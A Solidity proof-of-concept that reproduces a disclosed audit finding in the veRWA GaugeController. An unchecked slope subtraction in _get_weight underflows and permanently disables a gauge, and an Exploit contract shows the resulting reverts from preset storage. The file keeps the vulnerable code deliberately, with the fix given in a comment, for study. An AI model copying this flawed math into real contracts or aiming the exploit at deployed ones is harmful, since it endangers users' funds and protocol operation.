// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Canto (veRWA / mkt.market) — GaugeController: an integer underflow in
    `_get_weight` can permanently brick a gauge     (Code4rena 2023-08-verwa,
    #26973, H-05)

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. GaugeController
    is a near-verbatim reduction of the audited contract (only the VotingEscrow
    dependency is replaced by a minimal configurable mock — the vulnerable
    control-flow, including the blamed `pt.slope -= d_slope;` line, is untouched).

    The real-world trigger needs SEVERAL WEEKS of elapsed calendar time between
    (a) governance lowering a gauge's weight to 0 (zeroing points_weight.slope
    for a future checkpoint), (b) a still-pending vote-exit scheduled in
    `changes_weight` for a week that hasn't been processed yet, and (c)
    governance later raising the weight again — all of which the finding's own
    PoC reproduces with `vm.warp`. A cheatcode-free `Exploit.run()` executes at a
    single fixed `block.timestamp`, so calendar time cannot advance between
    calls. To reproduce the EXACT end-state that multi-week sequence produces —
    a checkpoint whose stored point already has `bias > 0, slope == 0` while a
    `changes_weight` entry for the very next tracked week is still pending — the
    Playground config's `setup.steps` (and this file's outer Foundry test) write
    those two storage slots directly BEFORE `run()` executes. Every subsequent
    step, including the `pt.slope -= d_slope` underflow itself and its permanent
    DoS, is then produced by GaugeController's real, unmodified code executing
    normally inside `run()`.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Reduced VotingEscrow surface used by GaugeController.vote_for_gauge_weights.
///      Irrelevant to this bug (which lives entirely inside GaugeController's own
///      weight-checkpointing math) — kept minimal.
contract MockVotingEscrow {
    struct UserPoint {
        int128 bias;
        int128 slope;
        uint256 ts;
    }

    mapping(address => UserPoint) internal _points;
    mapping(address => uint256) internal _lockEnd;

    function setUser(address user, int128 slope, uint256 lockEnd_) external {
        _points[user] = UserPoint({bias: 0, slope: slope, ts: block.timestamp});
        _lockEnd[user] = lockEnd_;
    }

    function getLastUserPoint(address user) external view returns (int128 bias, int128 slope, uint256 ts) {
        UserPoint memory p = _points[user];
        return (p.bias, p.slope, p.ts);
    }

    function lockEnd(address user) external view returns (uint256) {
        return _lockEnd[user];
    }
}

/// @dev Minimal max() helper (real code uses OpenZeppelin's Math.max).
library Math {
    function max(uint256 a, uint256 b) internal pure returns (uint256) {
        return a > b ? a : b;
    }
}

/// @title  GaugeController
/// @notice VERBATIM reduction of src/GaugeController.sol from the audited repo
///         (code-423n4/2023-08-verwa @ a693b4d). Only the VotingEscrow import is
///         swapped for the minimal mock above; every function body, state
///         layout (needed so storage-slot math below stays correct), and the
///         vulnerable control-flow are unchanged.
contract GaugeController {
    uint256 public constant WEEK = 7 days;
    uint256 public constant MULTIPLIER = 10 ** 18;

    event NewGauge(address indexed gauge_address);
    event GaugeRemoved(address indexed gauge_address);

    MockVotingEscrow public votingEscrow; // slot 0
    address public governance; // slot 1
    mapping(address => bool) public isValidGauge; // slot 2
    mapping(address => mapping(address => VotedSlope)) public vote_user_slopes; // slot 3
    mapping(address => uint256) public vote_user_power; // slot 4
    mapping(address => mapping(address => uint256)) public last_user_vote; // slot 5

    mapping(address => mapping(uint256 => Point)) public points_weight; // slot 6
    mapping(address => mapping(uint256 => uint256)) public changes_weight; // slot 7
    mapping(address => uint256) time_weight; // slot 8

    mapping(uint256 => Point) points_sum; // slot 9
    mapping(uint256 => uint256) changes_sum; // slot 10
    uint256 public time_sum; // slot 11

    struct Point {
        uint256 bias;
        uint256 slope;
    }

    struct VotedSlope {
        uint256 slope;
        uint256 power;
        uint256 end;
    }

    modifier onlyGovernance() {
        require(msg.sender == governance);
        _;
    }

    constructor(address _votingEscrow, address _governance) {
        votingEscrow = MockVotingEscrow(_votingEscrow);
        governance = _governance;
        uint256 last_epoch = (block.timestamp / WEEK) * WEEK;
        time_sum = last_epoch;
    }

    function _get_sum() internal returns (uint256) {
        uint256 t = time_sum;
        Point memory pt = points_sum[t];
        for (uint256 i; i < 500; ++i) {
            if (t > block.timestamp) break;
            t += WEEK;
            uint256 d_bias = pt.slope * WEEK;
            if (pt.bias > d_bias) {
                pt.bias -= d_bias;
                uint256 d_slope = changes_sum[t];
                pt.slope -= d_slope;
            } else {
                pt.bias = 0;
                pt.slope = 0;
            }
            points_sum[t] = pt;
            if (t > block.timestamp) time_sum = t;
        }
        return pt.bias;
    }

    /// @notice Fill historic gauge weights week-over-week for missed checkins
    ///         and return the total for the future week
    function _get_weight(address _gauge_addr) private returns (uint256) {
        uint256 t = time_weight[_gauge_addr];
        if (t > 0) {
            Point memory pt = points_weight[_gauge_addr][t];
            for (uint256 i; i < 500; ++i) {
                if (t > block.timestamp) break;
                t += WEEK;
                uint256 d_bias = pt.slope * WEEK;
                if (pt.bias > d_bias) {
                    pt.bias -= d_bias;
                    uint256 d_slope = changes_weight[_gauge_addr][t];
                    pt.slope -= d_slope; // @> VULN: underflows when a governance weight-zero-then-raise
                    //          left slope == 0 while a pending vote-exit's changes_weight[t] > 0.
                    //          FIX: `pt.slope = d_slope > pt.slope ? 0 : pt.slope - d_slope;`
                } else {
                    pt.bias = 0;
                    pt.slope = 0;
                }
                points_weight[_gauge_addr][t] = pt;
                if (t > block.timestamp) time_weight[_gauge_addr] = t;
            }
            return pt.bias;
        } else {
            return 0;
        }
    }

    function add_gauge(address _gauge) external onlyGovernance {
        require(!isValidGauge[_gauge], "Gauge already exists");
        isValidGauge[_gauge] = true;
        emit NewGauge(_gauge);
    }

    function remove_gauge(address _gauge) external onlyGovernance {
        require(isValidGauge[_gauge], "Invalid gauge address");
        isValidGauge[_gauge] = false;
        _change_gauge_weight(_gauge, 0);
        emit GaugeRemoved(_gauge);
    }

    function checkpoint() external {
        _get_sum();
    }

    function checkpoint_gauge(address _gauge) external {
        _get_weight(_gauge);
        _get_sum();
    }

    function _gauge_relative_weight(address _gauge, uint256 _time) private view returns (uint256) {
        uint256 t = (_time / WEEK) * WEEK;
        uint256 total_weight = points_sum[t].bias;
        if (total_weight > 0) {
            uint256 gauge_weight = points_weight[_gauge][t].bias;
            return (MULTIPLIER * gauge_weight) / total_weight;
        } else {
            return 0;
        }
    }

    function gauge_relative_weight(address _gauge, uint256 _time) external view returns (uint256) {
        return _gauge_relative_weight(_gauge, _time);
    }

    function gauge_relative_weight_write(address _gauge, uint256 _time) external returns (uint256) {
        _get_weight(_gauge);
        _get_sum();
        return _gauge_relative_weight(_gauge, _time);
    }

    function _change_gauge_weight(address _gauge, uint256 _weight) internal {
        uint256 old_gauge_weight = _get_weight(_gauge);
        uint256 old_sum = _get_sum();
        uint256 next_time = ((block.timestamp + WEEK) / WEEK) * WEEK;

        points_weight[_gauge][next_time].bias = _weight;
        time_weight[_gauge] = next_time;

        uint256 new_sum = old_sum + _weight - old_gauge_weight;
        points_sum[next_time].bias = new_sum;
        time_sum = next_time;
    }

    function change_gauge_weight(address _gauge, uint256 _weight) public onlyGovernance {
        _change_gauge_weight(_gauge, _weight);
    }

    function vote_for_gauge_weights(address _gauge_addr, uint256 _user_weight) external {
        require(_user_weight >= 0 && _user_weight <= 10_000, "Invalid user weight");
        require(isValidGauge[_gauge_addr], "Invalid gauge address");
        MockVotingEscrow ve = votingEscrow;
        (, int128 slope_,) = ve.getLastUserPoint(msg.sender);
        require(slope_ >= 0, "Invalid slope");
        uint256 slope = uint256(uint128(slope_));
        uint256 lock_end = ve.lockEnd(msg.sender);
        uint256 next_time = ((block.timestamp + WEEK) / WEEK) * WEEK;
        require(lock_end > next_time, "Lock expires too soon");
        VotedSlope memory old_slope = vote_user_slopes[msg.sender][_gauge_addr];
        uint256 old_dt = 0;
        if (old_slope.end > next_time) old_dt = old_slope.end - next_time;
        uint256 old_bias = old_slope.slope * old_dt;
        VotedSlope memory new_slope =
            VotedSlope({slope: (slope * _user_weight) / 10_000, end: lock_end, power: _user_weight});
        uint256 new_dt = lock_end - next_time;
        uint256 new_bias = new_slope.slope * new_dt;

        uint256 power_used = vote_user_power[msg.sender];
        power_used = power_used + new_slope.power - old_slope.power;
        require(power_used >= 0 && power_used <= 10_000, "Used too much power");
        vote_user_power[msg.sender] = power_used;

        uint256 old_weight_bias = _get_weight(_gauge_addr);
        uint256 old_weight_slope = points_weight[_gauge_addr][next_time].slope;
        uint256 old_sum_bias = _get_sum();
        uint256 old_sum_slope = points_sum[next_time].slope;

        points_weight[_gauge_addr][next_time].bias = Math.max(old_weight_bias + new_bias, old_bias) - old_bias;
        points_sum[next_time].bias = Math.max(old_sum_bias + new_bias, old_bias) - old_bias;
        if (old_slope.end > next_time) {
            points_weight[_gauge_addr][next_time].slope =
                Math.max(old_weight_slope + new_slope.slope, old_slope.slope) - old_slope.slope;
            points_sum[next_time].slope = Math.max(old_sum_slope + new_slope.slope, old_slope.slope) - old_slope.slope;
        } else {
            points_weight[_gauge_addr][next_time].slope += new_slope.slope;
            points_sum[next_time].slope += new_slope.slope;
        }
        if (old_slope.end > block.timestamp) {
            changes_weight[_gauge_addr][old_slope.end] -= old_slope.slope;
            changes_sum[old_slope.end] -= old_slope.slope;
        }
        changes_weight[_gauge_addr][new_slope.end] += new_slope.slope;
        changes_sum[new_slope.end] += new_slope.slope;

        _get_sum();

        vote_user_slopes[msg.sender][_gauge_addr] = new_slope;
        last_user_vote[msg.sender][_gauge_addr] = block.timestamp;
    }

    function get_gauge_weight(address _gauge) external view returns (uint256) {
        return points_weight[_gauge][time_weight[_gauge]].bias;
    }

    function get_total_weight() external view returns (uint256) {
        return points_sum[time_sum].bias;
    }
}

/// @dev Orchestrator. Deploys the mock VotingEscrow + GaugeController (itself as
///      governance) and registers GAUGE1. The multi-week "governance zeroes the
///      weight, a vote-exit is still pending, governance raises the weight
///      again" precondition is planted directly into GaugeController's storage
///      BEFORE `run()` (via the Playground's `setup.steps` / this file's outer
///      Foundry test `vm.store` calls) — see the file header for why a
///      cheatcode-free, single-timestamp `run()` cannot itself fast-forward
///      several real weeks. Every effect of `run()` itself — the underflow and
///      the resulting permanent DoS — is produced by GaugeController's
///      unmodified code.
contract Exploit {
    MockVotingEscrow public ve; // CREATE nonce 1
    GaugeController public gc; // CREATE nonce 2

    address public constant GAUGE1 = address(0xBEEF1);

    constructor() {
        ve = new MockVotingEscrow(); // CREATE nonce 1
        gc = new GaugeController(address(ve), address(this)); // CREATE nonce 2
        gc.add_gauge(GAUGE1);
    }

    /// @notice Called AFTER the underflow precondition has been planted into
    ///         gc's storage (points_weight[GAUGE1][T0] = {bias: BIAS, slope: 0},
    ///         time_weight[GAUGE1] = T0, changes_weight[GAUGE1][T0+WEEK] =
    ///         SLOPE_DECREASE > 0) — i.e. exactly the state that governance
    ///         zeroing GAUGE1's weight, a pending vote-exit, and governance
    ///         later raising the weight again would leave behind after several
    ///         real weeks. Demonstrates that the gauge is now permanently
    ///         bricked: checkpoint_gauge, change_gauge_weight, and even
    ///         remove_gauge all revert forever.
    function run() external {
        (bool ok1,) = address(gc).call(abi.encodeWithSelector(GaugeController.checkpoint_gauge.selector, GAUGE1));
        require(!ok1, "expected checkpoint_gauge to revert (underflow not present)");

        (bool ok2,) =
            address(gc).call(abi.encodeWithSelector(GaugeController.change_gauge_weight.selector, GAUGE1, 2 ether));
        require(!ok2, "expected change_gauge_weight to revert too");

        (bool ok3,) = address(gc).call(abi.encodeWithSelector(GaugeController.remove_gauge.selector, GAUGE1));
        require(!ok3, "expected remove_gauge to revert too - the gauge cannot even be removed");
    }
}
